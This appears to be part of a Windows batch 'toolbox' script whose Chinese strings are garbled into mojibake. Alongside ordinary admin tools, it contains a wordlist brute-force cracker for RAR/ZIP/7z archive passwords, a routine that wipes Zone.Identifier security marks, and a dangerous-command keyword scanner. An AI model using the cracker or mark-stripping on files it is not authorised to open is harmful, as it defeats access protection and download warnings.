if not exist "%temp%\DOS��������ʱĿ¼" (call :md "%temp%\DOS��������ʱĿ¼")
>"%temp%\DOS��������ʱĿ¼\˵��.txt" echo;���ļ�����DOS���������ʱ�ļ���,ɾ�����޷��������е����ݣ�
>"%temp%\DOS��������ʱĿ¼\!txnrmc! - ��ʱ�����ļ�.bat" (
echo;@echo off
echo;title !txnrmc!
echo;color f1
echo;echo;
echo;cls
echo;echo;��������:"!txnr!"
echo;%hx%
echo;echo;���ļ���DOS������ - ��ʱ����ָ�����ݹ�������
echo;echo;����ʱ��:!date:~0,4!��!date:~5,21��!date:~8,21�� !xingqi!!time:~0,8!
echo;%hx%
echo;echo;��������˳�^&^>nul pause
)
schtasks /create /tn "!txnrmc!" /tr "%temp%\DOS��������ʱĿ¼\!txnrmc! - ��ʱ�����ļ�.bat" /st !txnrsj! /sd !txnrrq! /sc once&&echo;������!txnrrq! !txnrsj!����
echo;�����ļ��ѱ�����"%temp%\DOS��������ʱĿ¼\!txnrmc! - ��ʱ�����ļ�.bat"
%hx%
%pause%
endlocal
goto 32
:32.2
title ��ʱ����ָ���ļ�!system!
cls
set dsyxmc=
set /p "dsyxmc=ָ����������: "
call :var dsyxmc
%hx%
set dsyxlj=
set /p "dsyxlj=�϶���Ҫ��ʱ���е��ļ����˴���: "
call :var dsyxlj
call :lj dsyxlj dsyxlj
%hx%
set dsyxrq=
set /p "dsyxrq=������������(��ʽ: yyyy/mm/dd ����2015/08/05): "
call :var dsyxrq
%hx%
set dsyxsj=
set /p "dsyxsj=��������ʱ��(��ʽ: hh:mm:ss ����09:03:05): "
call :var dsyxsj
cls
if not exist "%temp%\DOS��������ʱĿ¼" (call :md "%temp%\DOS��������ʱĿ¼")
>"%temp%\DOS��������ʱĿ¼\˵��.txt" echo;���ļ�����DOS���������ʱ�ļ���,ɾ�����޷��������е����ݣ�
>"%temp%\DOS��������ʱĿ¼\!dsyxmc! - ��ʱ�����ļ�.bat" echo;"!dsyxlj!"
schtasks /create /tn "!dsyxmc!" /tr "%temp%\DOS��������ʱĿ¼\!dsyxmc! - ��ʱ�����ļ�.bat" /st !dsyxsj! /sd !dsyxrq! /sc once&&echo;������!dsyxrq! !dsyxsj!����
echo;�����ļ��ѱ�����"%temp%\DOS��������ʱĿ¼\!dsyxmc! - ��ʱ�����ļ�.bat"
%hx%
%pause%
endlocal
goto 32
:32.3
title ��ʾ���еļƻ�����!system!
cls
schtasks /query
%hx%
%pause%
endlocal
goto 32
:32.4
title ɾ���ƻ�����!system!
cls
schtasks /query
%hx%
set rwsc=
set /p "rwsc=����Ҫɾ������������: "
call :var rwsc
cls
schtasks /delete /tn "!rwsc!" /f
del /f /q "%temp%\DOS��������ʱĿ¼\!rwsc! - ��ʱ�����ļ�.bat";^
		"%temp%\DOS��������ʱĿ¼\!rwsc! - ��ʱ�����ļ�.bat"
>nul 2>nul dir /a /s "%temp%\DOS��������ʱĿ¼\*.bat"||rd /s /q "%temp%\DOS��������ʱĿ¼"
%hx%
%pause%
endlocal
goto 32
:33
setlocal
title ��ʱ��!system!
cls
echo;��ʱ����ȷ��0.01��
%hx%
echo;���������ʼ��ʱ(����������ʱ)&>nul pause
set "kssjbk=!time!"
cls
echo;��ʱ���ѿ�ʼ��ʱ,�������ֹͣ��ʱ.&>nul pause
set "jssjbk=!time!"
call :sjc !kssjbk! !jssjbk! jg format
cls
echo;��ʱ��ʼʱ��: !kssjbk!
echo;��ʱ����ʱ��: !jssjbk!
echo;��ʱ: !jg!
%hx%
%pause%
endlocal
goto memuv2
:34
setlocal
title �������������!system!
cls
set mmws=
set mmxz=
set mmjg=
set mmjs=aA0bB1cC2dD3eE4fF5gG6hH7iI8jJ9kK0lL1mM2nN3oO4pP5qQ6rR7sS8tT9uU0vV1wW2xX3yY4zZ5
set /p "mmws=�������ɵ�����λ��: "
call :checkvar mmws num&&(
	echo;ֻ������������
	%pause%
	endlocal
	goto 34
)
cls
for /l %%a in (1,1,!mmws!) do (
	set /a "mmxz=!random!%%63"
	for %%a in (!mmxz!) do (set "mmjg=!mmjg!!mmjs:~%%a,1!")
)
echo;�����ɵ��������:
echo;!mmjg!
%hx%
%pause%
endlocal
goto memuv2
:35
setlocal
title ɾ��ÿ���̷��µ�System Volume Information�ļ���!system!
cls
echo;���������ʼɾ��System Volume Information�ļ���&>nul pause
cls
call :sypf sypf
for %%a in (!sypf!) do (
	if exist "%%aSystem Volume Information" (
		call :isntfs %%a||>nul call :wjqx "%%aSystem Volume Information"
		call :isrefs %%a||>nul call :wjqx "%%aSystem Volume Information"
		attrib -s -h -r "%%aSystem Volume Information"
		rd /s /q "%%aSystem Volume Information"&&echo;��ɾ��: "%%aSystem Volume Information"
	)
)
%hx%
echo;ɾ�����
%pause%
endlocal
goto memuv2
:36
setlocal
title ������ת����!system!
cls
echo;���֧��2147483647��ʮ����ת��
%hx%
for %%a in (
	"[1]����ʮ����ת��"
	"[2]���������ת��"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=120
%sel% shuru
if "!shuru!" equ "1" (goto 10z)
if "!shuru!" equ "2" (goto 2z)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ��!"
call :out 2
endlocal
goto 36
:10z
cls
set shijinzhi=
set erjinzhi=
set shilioujinzhi=
set bajinzhi=
set /p "shijinzhi=����ʮ��������: "
call :checkvar shijinzhi num&&goto 10z
set /a "shijinzhi=shijinzhi"
cls
echo;ʮ����: !shijinzhi!
call :10to2 !shijinzhi! erjinzhi
echo;������: !erjinzhi!
call :10to8 !shijinzhi! bajinzhi
echo;�˽���: !bajinzhi!
call :10to16 !shijinzhi! shilioujinzhi
echo;ʮ������: !shilioujinzhi!
%hx%
%pause%
endlocal
goto 36
:2z
cls
set srejz=
set sjz=
set shilioujinzhi=
set bajinzhi=
set /p "srejz=�������������: "
if not defined srejz (goto 2z)
for /f "delims=01" %%a in ("!srejz!") do (goto 2z)
cls
call :2to10 !srejz! sjz
echo;ʮ����: !sjz!
echo;������: !srejz!
call :10to8 !sjz! bajinzhi
echo;�˽���: !bajinzhi!
call :10to16 !sjz! shilioujinzhi
echo;ʮ������: !shilioujinzhi!
%hx%
%pause%
endlocal
goto 36
:guanyu
setlocal
title ����DOS������!system!
if "%~z0" equ "!versize!" (
	set daxiao1=
) else (
	set "daxiao1= (�ļ���С�쳣,�����ѱ��޸�)"
)
if /i "!processor_architecture!" equ "x86" (set bit=32) else (set bit=64)
call :sjc !dosqssj! !time! jg format
cls
echo;����DOS������
%hx%
echo;�汾:		1.9.6 (!ver!.!versize!)
if defined system (
	echo;����ϵͳ:	!system:~3! !bit!λ
) else (
	for /f "delims=" %%a in ('ver') do (echo;����ϵͳ:	%%a)
)
echo;��Ȩ����	2012-2025 Administrator ��������Ȩ��
%hx%
echo;����������:		!jg!
echo;DOS����������·��:	%~0
echo;�ļ���С:		%~z0 �ֽ�!daxiao1!
%hx%
%pause%
endlocal
goto memuv2
:37
setlocal
title �ı����!system!
cls
%hx%
echo;Ҫ��ʾ����ļ�,���ÿո����·��,��ʾ�ļ��Ժ�:
echo;F=��ʾ�¸��ļ�,Q=�˳�,�Ⱥ���ʾ����,�ո���ʾ��һҳ,�س���ʾ��һ��
%hx%
set wenben=
set /p "wenben=�϶���Ҫ��ʾ���ļ����˴���: "
call :ljjc wenben&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 37
)
%hx%
more /e /p "!wenben!"
%hx%
%pause%
endlocal
goto memuv2
:38
title ��ʾ��������û�������!system!
cls
%hx%
gpresult /z
%hx%
%pause%
goto memuv2
:39
setlocal
title NTFSѹ��!system!
cls
echo;�˹���ֻ������NTFS����
%hx%
for %%a in (
	"[1]NTFSѹ��"
	"[2]NTFS��ѹ"
	"[3]NTFSѹ���ļ���"
	"[4]NTFS��ѹ�ļ���"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=12340
%sel% shuru
if "!shuru!" equ "1" (goto yasuo)
if "!shuru!" equ "2" (goto jieya)
if "!shuru!" equ "3" (goto yasuowjj)
if "!shuru!" equ "4" (goto jieyawjj)
if "!shuru!" equ "5" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ��"
call :out 2
endlocal
goto 39
:jieya
title NTFS��ѹ!system!
cls
set jieya=
set /p "jieya=�϶���Ҫ��ѹ���ļ����˴���: "
call :ljjc jieya&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto jieya
)
%hx%
compact /u /a /i /f "!jieya!"
%hx%
%pause%
endlocal
goto 39
:yasuo
title NTFSѹ��!system!
cls
set yasuo=
set /p "yasuo=�϶���Ҫѹ�����ļ����˴���: "
call :ljjc yasuo&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto yasuo
)
%hx%
compact /c /a /i /f "!yasuo!"
%hx%
%pause%
endlocal
goto 39
:jieyawjj
title NTFS��ѹ�ļ���!system!
cls
set jieya=
set /p "jieya=�϶���Ҫ��ѹ���ļ��е��˴���: "
call :ljjc jieya dir&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto jieyawjj
)
%hx%
compact /u /a /i /f /s:"!jieya!"
%hx%
%pause%
endlocal
goto 39
:yasuowjj
title NTFSѹ���ļ���!system!
cls
set jieya=
set /p "jieya=�϶���Ҫѹ�����ļ��е��˴���: "
call :ljjc jieya dir&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto yasuowjj
)
%hx%
compact /c /a /i /f /s:"!jieya!"
%hx%
%pause%
endlocal
goto 39
:40
setlocal
title ��ȡ�ļ�����Ȩ��!system!
cls
echo;�˹���ֻ������NTFS��REFS����
%hx%
set ntfswjqx=
set /p "ntfswjqx=�϶���Ҫ��ȡ����Ȩ�޵��ļ������ļ��е��˴���(e=���ز˵�): "
call :var ntfswjqx
if not defined ntfswjqx (endlocal&goto 40)
if /i "!ntfswjqx!" equ "e" (
	endlocal
	goto memuv2
)
call :lj ntfswjqx ntfswjqx
set "ntfswjqx=!ntfswjqx:*=!"
set "ntfswjqx=!ntfswjqx:?=!"
if not exist "!ntfswjqx!" (
	<nul set /p "=·��������"
	call :out 2
	endlocal
	goto 40
)
%hx%
for /f "delims=" %%a in ("!ntfswjqx!") do (
	call :isntfs %%~da||call :wjqx "%%~fa"
	call :isrefs %%~da||call :wjqx "%%~fa"
)
%hx%
%pause%
endlocal
goto memuv2
:41
title ��ʾ����������!system!
cls
%hx%
if /i "!system:~11,1!" equ "x" (
	2>nul dir /a /s /b "%systemdrive%\Documents and Settings\%username%\����ʼ���˵�\����\����"
	2>nul dir /a /s /b "%systemdrive%\Documents and Settings\all users\����ʼ���˵�\����\����"
) else (
	2>nul dir /a /s /b "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
	2>nul dir /a /s /b "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
)
echo;
for /f "delims=" %%a in ('"2>nul reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows\load"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Userinit"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Setup"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v taskman"') do (if "%%a" neq "" (echo;%%a))
for /f "delims=" %%a in ('"2>nul reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"') do (if "%%a" neq "" (echo;%%a))
%hx%
%pause%
goto memuv2
:kcd
start mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();"
goto memuv2
:gcd
start mshta "javascript:with (new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0)){Eject();Eject();}window.close();"
goto memuv2
:42
setlocal
title �����Ķ���!system!
cls
set ydnr=
set /p "ydnr=����Ҫ�Ķ�������: "
call :var ydnr
start mshta vbscript:createobject("sapi.spvoice").speak("!ydnr!")(window.close)
%hx%
%pause%
endlocal
goto memuv2
:43
setlocal
title �������ļ����շ���!system!
set dx=0
cls
set batfx=
set /p "batfx=�϶�Ҫ�������ļ����˴���: "
call :ljjc batfx&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 43
)
%hx%
for %%a in (
	del rd arp assoc
	attrib cacls format ftype
	taskkill tasklist reg ren
	regsvr32 rd schtasks shutdown
) do (
	findstr /n /i /c:"%%a" "!batfx!"&&set /a "dx+=1"
)
%hx%
echo;�������ļ�: !batfx!
echo;Σ�յȼ�: !dx!
%hx%
%pause%
endlocal
goto memuv2
:44
setlocal
title �ļ�����!system!
cls
set sswjm=
set /p "sswjm=����Ҫ�������ļ���(Ĭ���ڵ�ǰĿ¼������): "
call :var sswjm
%hx%
dir /a /s "!sswjm!"
%hx%
%pause%
endlocal
goto memuv2
:45
setlocal
title �޸����𻵵��ļ�!system!
cls
set xfwj=
set /p "xfwj=�϶�Ҫ�޸����ļ����˴���: "
call :ljjc xfwj&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 45
)
%hx%
recover "!xfwj!"
%hx%
%pause%
endlocal
goto memuv2
:46
setlocal
title �����ƽ�ѹ��������!system!
cls
set rarazlj=
for /f "skip=2 tokens=3" %%a in ('"2>nul reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /v path"') do (
	set "rarazlj=%%a"
	set "rarpd=!rarazlj!\Rar.exe"
	set "rarpd7z=!rarazlj!\winrar.exe"
)
cls
if not exist "!rarpd!" (
	echo;û�а�װWinRAR.
	echo;����7-Zip...
	set 7zlj=
	for /f "skip=2 tokens=3" %%a in ('"2>nul reg query "HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip" /v path"') do (
		set "7zlj=%%a"
		set "7zlj=!7zlj!7z.exe"
		set "rarpd=!7zlj!"
		set "rarpd7z=!7zlj!"
	)
)
if not exist "!rarpd!" (
	echo;û���ҵ�7-Zip
	%hx%
	%pause%
	endlocal
	goto memuv2
)
set yswjlj=
set /p "yswjlj=�϶�Ҫ�ƽ��ѹ�������˴���(e=���ز˵�): "
call :var yswjlj
if /i "!yswjlj!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc yswjlj&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 46
)
for /f "delims=" %%a in ("!yswjlj!") do (
	if /i "%%~xa" equ ".7z" (
		set "rarpd=!rarpd7z!"
		goto rarwjok
	)
	for %%a in (.rar .zip) do (
		if "%%~xa" equ "%%a" (goto rarwjok)
	)
	<nul set /p "=��Ч���ļ���ʽ��"
	call :out 2
	endlocal
	goto 46
)
:rarwjok
set pjzd=
set /p "pjzd=�϶��ֵ��ļ����˴���(e=���ز˵�): "
call :var pjzd
if /i "!pjzd!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc pjzd&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto rarwjok
)
for /f "delims=" %%a in ("!pjzd!") do (
	if /i "%%~xa" neq ".txt" (
		<nul set /p "=����txt�ļ���"
		call :out 2
		goto rarwjok
	)
)
:kspj
%hx%
for /f "usebackq delims=" %%a in ("!pjzd!") do (
	cls
	echo;�����ƽ��ѹ����: "!yswjlj!"
	echo;
	echo;����ʹ�õ��ֵ��ļ�: "!pjzd!"
	echo;
	echo;���ڳ�������: "%%a"
	"!rarpd!" t -y -inul -p"%%a" "!yswjlj!"&&(
		set "pjmm=%%a"
		goto pjcg
	)
)
:pjsb
%hx%
echo;�ƽ�ʧ�ܣ�
echo;
echo;�ֵ���û����ȷ������
%hx%
%pause%
endlocal
goto memuv2
:pjcg
cls
call :bel
echo;�ƽ�ɹ���
echo;
echo;ѹ����: "!yswjlj!"
echo;��ѹ������: "!pjmm!"
%hx%
%pause%
endlocal
goto memuv2
:47
setlocal
title Wifi�ȵ�!system!
cls
%hx%
for %%a in (
	"[1]����Wifi�ȵ�"
	"[2]�ر�Wifi�ȵ�"
	"[3]�鿴��������"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=1230
%sel% shuru
if "!shuru!" equ "1" (goto kqwifi)
if "!shuru!" equ "2" (goto gbwifi)
if "!shuru!" equ "3" (goto wlpz)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 47
:kqwifi
title ����Wifi�ȵ�!system!
cls
set wifissid=
set wifimiam=
set /p "wifissid=����Wifi����(SSID): "
set /p "wifimima=����Wifi����(����λ��:8��63λ): "
call :var wifissid
call :var wifimima
cls
net start sharedaccess
netsh wlan stop hostednetwork
netsh wlan set hostednetwork mode=allow ssid="!wifissid!" key=!wifimima!
netsh wlan start hostednetwork
%hx%
echo;����޷��������ֶ���ȡIP��ַ(�������ϵͳ����ǽҲ���޷����ӳɹ�)
echo;Wifi����(SSID): !wifissid!
echo;Wifi����: !wifimima!
%hx%
%pause%
endlocal
goto 47
:gbwifi
title �ر�Wifi�ȵ�!system!
cls
netsh wlan stop hostednetwork
%hx%
%pause%
endlocal
goto 47
:wlpz
title �鿴��������!system!
cls
ipconfig /all
netsh wlan show drivers
netsh wlan show interface
netsh interface Teredo show state
netsh interface udp show global
netsh interface tcp show global
netsh interface tcp show heuristics
netsh interface tcp show security
echo;IPv4
netsh interface ipv4 show global
netsh interface ipv4 show tcpstats
echo;IPv6
netsh interface ipv6 show global
netsh interface ipv6 show tcpstats
%hx%
%pause%
endlocal
goto 47
:48
setlocal
title ������chm�ļ�!system!
cls
set chmlj=
set /p "chmlj=���϶�Ҫ�������chm�ļ����˴���(e=����): "
call :var chmlj
if /i "!chmlj!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc chmlj&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 48
)
for /f "delims=" %%a in ("!chmlj!") do (
	if /i "%%~xa" neq ".chm" (
		%hx%
		<nul set /p "=����chm�ļ���"
		call :out 2
		endlocal
		goto 48
	)
	copy /y "!chmlj!" !windir!\temp\tmp.chm
	hh -decompile !windir!\temp\chm !windir!\temp\tmp.chm
	md "%%~na_chm"
	xcopy /c /e /y !windir!\temp\chm "%%~na_chm"
	rd /s /q !windir!\temp\chm
	del /f /q !windir!\temp\tmp.chm
	cls
	echo;������ɹ���
	echo;�Ա��浽"%~dp0%%~na_chm"
)
%hx%
%pause%
endlocal
goto memuv2
:49
:js
title �ر�����Ӧ����!system!
cls
taskkill /f /fi "status eq not responding"
%hx%
%pause%
goto memuv2
:50
setlocal
title �ļ��Ƚ���!system!
cls
echo;�϶�Ҫ�Ƚϵ��ļ����˴���(�ȽϹ��������� "Ctrl+C" 2�οɽ����Ƚ�)
%hx%
set /p "wj1=��һ��Ҫ�Ƚϵ��ļ�: "
set /p "wj2=�ڶ���Ҫ�Ƚϵ��ļ�: "
call :var wj1
call :var wj2
call :lj wj1 wj1
call :lj wj2 wj2
%hx%
fc /b "!wj1!" "!wj2!"
%hx%
%pause%
endlocal
goto memuv2
:51
setlocal
title ������д����а�!system!
cls
set nz=
set /p "nz=����Ҫд�뵽���а����������:"
if exist "!windir!\system32\clip.exe" (
	echo;!nz!|clip
) else (
	call :51.1
)
if errorlevel 1 (echo;д��ʧ��) else (echo;д��ɹ�)
%hx%
%pause%
endlocal
goto memuv2
:51.1
mshta vbscript:clipboardData.SetData("text","!nz!")(window.close)
goto :eof
:52
start services.msc
goto memuv2
:53
setlocal
cls
title ��֪�����ռ�������!system!
set jsxq=
set /p "jsxq=����������(����20150605): "
call :checkvar jsxq year&&(
	<nul set /p "=��������ȷ�ĸ�ʽ!"
	call :out 2
	endlocal
	goto 53
)
set "y=!jsxq:~0,4!"
set "m=!jsxq:~4,2!"
set "d=!jsxq:~6,2!"
if 1!m! lss 110 (set "m=!m:~1!")
if 1!d! lss 110 (set "d=!d:~1!")
set /a "leap=y%%4"
set /a "leap100=y%%100"
set /a "leap400=y%%400"
if "!leap!" equ "0" (
	if "!leap100!" neq "0" (set rn=����)
) else (
	set rn=ƽ��
)
if "!leap100!" equ "0" (
	if "!leap400!" neq "0" (set rn=ƽ��)
)
if "!leap400!" equ "0" (set rn=����)
if !m! lss 3 (
	set /a "m+=12"
	set /a "y-=1"
)
set /a "k=y%%100"
set /a "j=y/100"
set /a "w=(d+13*(m+1)/5+k+k/4+j/4+5*j)%%7"
if !w! gtr 4 (goto 53.1)
if "!w!" equ "1" (
	set w=��
) else (
	if "!w!" equ "2" (
		set w=һ
	) else (
		if "!w!" equ "3" (
			set w=��
		) else (
			if "!w!" equ "4" (
				set w=��
			)
		)
	)
)
goto 53.2
:53.1
if "!w!" equ "5" (
	set w=��
) else (
	if "!w!" equ "6" (
		set w=��
	) else (
		if "!w!" equ "0" (
			set w=��
		)
	)
)
:53.2
echo;
echo;!rn! !jsxq:~0,4!��!jsxq:~4,2!��!jsxq:~6,2!��������!w!
%hx%
%pause%
endlocal
goto memuv2
:54
setlocal
if /i "!processor_architecture!" equ "x86" (set bit=32) else (set bit=64)
cls
title ��ѯϵͳ����״̬!system!
echo;����ϵͳ: !system:~3! !bit!λ
if "!system:~11,2!" equ "XP" (echo;Windows XPϵͳ�޷�ʹ�ô˹��ܲ�ѯ)
%hx%
for %%a in (
	"[1]��ʾ�����Ϣ"
	"[2]��ʾ��ϸ�������Ϣ"
	"[3]��ʾ��ǰ���״̬�Ľ�ֹ����"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=1230
%sel% shuru
if "!shuru!" equ "1" (
	start slmgr.vbs -dli
	endlocal
	goto 54
)
if "!shuru!" equ "2" (
	start slmgr.vbs -dlv
	endlocal
	goto 54
)
if "!shuru!" equ "3" (
	start slmgr.vbs -xpr
	endlocal
	goto 54
)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 54
:55
setlocal
cls
title ����ָ���ļ��Ŀ�ݷ�ʽ������!system!
set kjfs=
set /p "kjfs=�϶�Ŀ���ļ����˴���: "
call :var kjfs
if not defined kjfs (endlocal&goto 55)
call :lj kjfs kjfs
for /f "delims=" %%a in ("!kjfs!") do (set "kjfsmc=%%~na")
mshta VBScript:Execute("Set a=CreateObject(""WScript.Shell""):Set b=a.CreateShortcut(a.SpecialFolders(""Desktop"") & ""\!kjfsmc!.lnk""):b.TargetPath=""!kjfs!"":b.WorkingDirectory=""%~dp0"":b.Save:close")
%hx%
%pause%
endlocal
goto memuv2
:56
start msconfig
goto memuv2
:57
setlocal
cls
title ����ͳ��!system!
set zstj=
set /p "zstj=��������:"
call :strlen zstj jg
echo;�ܼ�!jg!����(����������)
%hx%
%pause%
endlocal
goto memuv2
:58
setlocal
cls
title �����������ӻ�Ŀ¼����!system!
set jord=
set /p "jord=������������(j=Ŀ¼���� d=��������): "
call :var jord
set swjj=
set cwjj=
set /p "swjj=����Ҫ���ӵ��ļ���·��: "
set /p "cwjj=���������ļ��е����·��: "
call :var swjj
call :var cwjj
call :lj swjj swjj
call :lj cwjj cwjj
if /i "!jord!" equ "j" (
	mklink /j "!cwjj!" "!swjj!"
) else (
	if /i "!jord!" equ "d" (mklink /d "!cwjj!" "!swjj!")
)
%hx%
%pause%
endlocal
goto memuv2
:59
title �򿪹������̨!system!
start mmc
goto memuv2
:60
setlocal
cls
title ���Streams�ļ�����!system!
set jcwjsd=
set /p "jcwjsd=�϶�Ŀ���ļ����˴���: "
call :ljjc jcwjsd&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 60
)
>"!jcwjsd!:Zone.Identifier" <nul set /p "="
echo;�������
%hx%
%pause%
endlocal
goto memuv2
:61
setlocal
title ������ɾ�����г���װ���!system!
cls
%hx%
for %%a in (
	"[1]�г���װ���"
	"[2]ɾ������ϵͳ�еġ����װ���Ŀ¼��ע�������"
	"[3]�г�ָ��Ŀ¼����װ��ľ�����"
	"[4]�����̷�(������װ���)"
	"[5]ɾ���̷�(ɾ����װ���)"
	"[6]ΪEFI���������̷�"
	"[7]�����Զ�����"
	"[8]�����Զ�����"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=123456780
%sel% shuru
if "!shuru!" equ "1" (goto 61.1)
if "!shuru!" equ "2" (goto 61.2)
if "!shuru!" equ "3" (goto 61.3)
if "!shuru!" equ "4" (goto 61.4)
if "!shuru!" equ "5" (goto 61.5)
if "!shuru!" equ "6" (goto 61.6)
if "!shuru!" equ "7" (
	>nul mountvol /n
	if errorlevel 1 (echo;�����Զ�����ʧ��) else (echo;�����Զ����سɹ�)
	call :out 2
	endlocal
	goto 61
)
if "!shuru!" equ "8" (
	>nul mountvol /e
	if errorlevel 1 (echo;�����Զ�����ʧ��) else (echo;�����Զ����سɹ�)
	call :out 2
	endlocal
	goto 61
)
if "!shuru!" equ "9" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 61
:61.1
title �г���װ���!system!
cls
for /f "delims=" %%a in ('mountvol') do (
	set "var=%%a"
	if "!var:~-2!" equ "}\" (
		<nul set /p "=!var!"
	) else (
		if "!var:~-1!" equ "\" (
			for /f "tokens=1-4" %%a in ("!var!") do (
				if /i "%%a" equ "efi" (echo;%%a %%b %%c) else (echo;!var!)
			)
		) else (
			if "!var:~-3!" equ "***" (echo;!var!)
		)
	)
)
%hx%
%pause%
endlocal
goto 61
:61.2
title ɾ������ϵͳ�е�,���װ���Ŀ¼��ע�������!system!
cls
mountvol /r
if not errorlevel 1 (echo;�������)
%hx%
%pause%
endlocal
goto 61
:61.3
title �г�ָ��Ŀ¼����װ��ľ�����!system!
cls
call :sypf sypf
echo;!sypf!
%hx%
set xszz=
set /p "xszz=������Ҫ��ʾ���̷���·��: "
call :var xszz
cls
if defined xszz (
	if "!xszz:~1!" equ "" (set "xszz=!xszz!:")
	<nul set /p "=!xszz!"
) else (
	endlocal
	goto 61
)
mountvol !xszz! /l
%hx%
%pause%
endlocal
goto 61
:61.4
title �����̷�(������װ���)!system!
cls
set xx1=0
for /f "delims=" %%a in ('mountvol') do (
	set "var=%%a"
	if "!var:~-2!" equ "}\" (
		set /a "xx1+=1"
		set "b!xx1!=!var!"
		<nul set /p "=[!xx1!]!var!"
	) else (
		if "!var:~-1!" equ "\" (
			for /f "tokens=1-4" %%a in ("!var!") do (
				if /i "%%a" equ "efi" (echo;%%a %%b %%c) else (echo;!var!)
			)
		) else (
			if "!var:~-3!" equ "***" (echo;!var!)
		)
	)
)
echo;[0]�����ϼ��˵�
%hx%
set cjpf=
set /p "cjpf=ѡ��װ���: "
call :var cjpf
if not defined cjpf (goto 61.4)
if "!cjpf!" equ "0" (endlocal&goto 61)
set xzpf=
set /p "xzpf=�����̷���·��: "
call :var xzpf
if not defined xzpf (goto 61.4)
if "!xzpf:~1!" equ "" (
	set "xzpf=!xzpf!:"
) else (
	call :lj xzpf xzpf
